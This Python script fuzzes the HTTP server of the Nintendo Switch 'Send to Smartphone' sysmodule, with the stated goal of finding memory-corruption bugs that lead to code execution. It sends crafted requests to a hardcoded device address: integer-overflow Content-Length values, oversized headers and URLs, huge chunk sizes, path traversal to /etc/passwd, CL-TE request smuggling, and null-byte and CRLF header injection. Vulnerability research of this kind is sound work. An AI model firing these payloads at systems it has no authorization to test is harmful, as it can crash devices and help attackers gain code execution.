#!/usr/bin/env python3
"""
HTTP server fuzzer for Nintendo Switch ldn sysmodule (Send to Smartphone).
Library: cpp-httplib (old version, confirmed by multipart boundary).

Known: Range: bytes=0-SSIZE_MAX+1 crashes (DoS, std::out_of_range).
Goal: Find memory corruption bugs in HTTP parsing for code execution.
"""

import socket
import time
import subprocess
import sys
import json
from pathlib import Path
from datetime import datetime, timezone

TARGET = '192.168.0.1'
PORT = 80
EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "http_server"


def send_raw(data, timeout=3):
    """Send raw bytes, return response or error string."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(data)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        s.close()
        return b''.join(chunks)
    except ConnectionRefusedError:
        return "CONNREFUSED"
    except ConnectionResetError:
        return "CONNRESET"
    except socket.timeout:
        return "TIMEOUT"
    except BrokenPipeError:
        return "BROKENPIPE"
    except Exception as e:
        return f"ERROR:{e}"


def is_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET, PORT))
        s.close()
        return True
    except:
        return False


def ping_check():
    r = subprocess.run(['ping', '-c', '1', '-W', '1', TARGET], capture_output=True)
    return r.returncode == 0


def run_test(name, data, expect_crash=False):
    """Run a single test, return result dict."""
    alive_before = is_alive()
    if not alive_before:
        return {"name": name, "skip": "server down before test"}

    resp = send_raw(data)
    time.sleep(0.5)
    alive_after = is_alive()

    result = {
        "name": name,
        "request_len": len(data),
        "alive_before": alive_before,
        "alive_after": alive_after,
    }

    if isinstance(resp, bytes):
        result["response_len"] = len(resp)
        result["response_head"] = resp[:200].decode('latin-1', errors='replace')
        if resp.startswith(b'HTTP/'):
            status = resp.split(b' ', 2)[1].decode() if b' ' in resp else '?'
            result["status"] = status
    else:
        result["response"] = resp

    if not alive_after:
        result["CRASH"] = True
        print(f"  *** CRASH: {name} ***")
        time.sleep(3)
    else:
        print(f"  OK: {name} -> {result.get('status', result.get('response', '?'))}")

    return result


def main():
    print("=" * 60)
    print("  HTTP SERVER FUZZING")
    print(f"  Target: {TARGET}:{PORT}")
    print("=" * 60)

    if not is_alive():
        print("[!] Server not reachable. Exiting.")
        sys.exit(1)

    results = []

    # 1. Enumerate endpoints
    print("\n[*] Phase 1: Endpoint enumeration")
    for path in ['/', '/index.html', '/data', '/api', '/upload', '/download',
                 '/photo', '/image', '/file', '/list', '/status']:
        r = run_test(f"GET {path}", f'GET {path} HTTP/1.1\r\nHost: {TARGET}\r\n\r\n'.encode())
        results.append(r)

    # 2. HTTP methods
    print("\n[*] Phase 2: Method testing")
    for method in ['POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH']:
        r = run_test(f"{method} /", f'{method} / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: 0\r\n\r\n'.encode())
        results.append(r)

    # 3. Content-Length overflow (similar vector to Range)
    print("\n[*] Phase 3: Content-Length overflow")
    for cl in ['9223372036854775807', '9223372036854775808', '18446744073709551615', '-1', '0']:
        r = run_test(f"POST CL={cl}",
            f'POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: {cl}\r\n\r\n'.encode())
        results.append(r)
        if not is_alive():
            time.sleep(5)
            if not ping_check():
                print("  Switch down, waiting...")
                time.sleep(10)

    # 4. Huge headers
    print("\n[*] Phase 4: Header overflow")
    for size in [4096, 8192, 16384, 32768, 65536]:
        big_header = 'X-Fuzz: ' + 'A' * size
        r = run_test(f"Header {size}B",
            f'GET / HTTP/1.1\r\nHost: {TARGET}\r\n{big_header}\r\n\r\n'.encode())
        results.append(r)
        if r.get("CRASH"):
            break

    # 5. Many headers
    print("\n[*] Phase 5: Header count")
    for count in [100, 500, 1000]:
        headers = ''.join(f'X-H{i}: value{i}\r\n' for i in range(count))
        r = run_test(f"{count} headers",
            f'GET / HTTP/1.1\r\nHost: {TARGET}\r\n{headers}\r\n'.encode())
        results.append(r)
        if r.get("CRASH"):
            break

    # 6. URL length
    print("\n[*] Phase 6: URL overflow")
    for size in [1024, 4096, 8192, 16384, 65536]:
        path = '/' + 'A' * size
        r = run_test(f"URL {size}B",
            f'GET {path} HTTP/1.1\r\nHost: {TARGET}\r\n\r\n'.encode())
        results.append(r)
        if r.get("CRASH"):
            break

    # 7. Chunked transfer encoding
    print("\n[*] Phase 7: Chunked encoding")
    chunked = 'POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\n\r\n'.format(TARGET)
    chunked += '5\r\nHello\r\n0\r\n\r\n'
    r = run_test("Chunked POST", chunked.encode())
    results.append(r)

    # Huge chunk size
    chunked_huge = 'POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\n\r\n'.format(TARGET)
    chunked_huge += 'FFFFFFFFFFFFFFFE\r\n'
    r = run_test("Chunked huge size", chunked_huge.encode())
    results.append(r)

    # 8. Multipart
    print("\n[*] Phase 8: Multipart body")
    boundary = 'fuzzbound123'
    mp_body = f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="test.bin"\r\nContent-Type: application/octet-stream\r\n\r\n'
    mp_body += 'A' * 10000
    mp_body += f'\r\n--{boundary}--\r\n'
    r = run_test("Multipart upload",
        f'POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Type: multipart/form-data; boundary={boundary}\r\nContent-Length: {len(mp_body)}\r\n\r\n{mp_body}'.encode())
    results.append(r)

    # 9. Path traversal
    print("\n[*] Phase 9: Path traversal")
    for path in ['/../../../etc/passwd', '/..%2f..%2f..%2fetc/passwd',
                 '/%00', '/\x00test', '/index.html%00.txt']:
        r = run_test(f"Traversal {path[:30]}",
            f'GET {path} HTTP/1.1\r\nHost: {TARGET}\r\n\r\n'.encode())
        results.append(r)

    # 10. HTTP request smuggling
    print("\n[*] Phase 10: Request smuggling")
    smuggle = f'POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {TARGET}\r\n\r\n'
    r = run_test("CL-TE smuggle", smuggle.encode())
    results.append(r)

    # 11. Malformed requests
    print("\n[*] Phase 11: Malformed requests")
    malformed = [
        ("No version", b'GET /\r\n\r\n'),
        ("HTTP/0.9", b'GET /\r\n'),
        ("HTTP/2.0", f'GET / HTTP/2.0\r\nHost: {TARGET}\r\n\r\n'.encode()),
        ("Double CL", f'GET / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: 0\r\nContent-Length: 99999\r\n\r\n'.encode()),
        ("Null in header", f'GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Null: test\x00inject\r\n\r\n'.encode()),
        ("CRLF inject", f'GET / HTTP/1.1\r\nHost: {TARGET}\r\nX-Inject: test\r\nInjected: yes\r\n\r\n'.encode()),
    ]
    for name, data in malformed:
        r = run_test(name, data)
        results.append(r)

    # Summary
    print("\n" + "=" * 60)
    crashes = [r for r in results if r.get("CRASH")]
    print(f"  Tests: {len(results)}, Crashes: {len(crashes)}")
    for c in crashes:
        print(f"    CRASH: {c['name']}")
    print("=" * 60)

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / f"fuzz_results_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": f"{TARGET}:{PORT}",
            "tests": len(results),
            "crashes": len(crashes),
            "results": results,
        }, f, indent=2)
    print(f"Evidence: {path}")


if __name__ == '__main__':
    main()
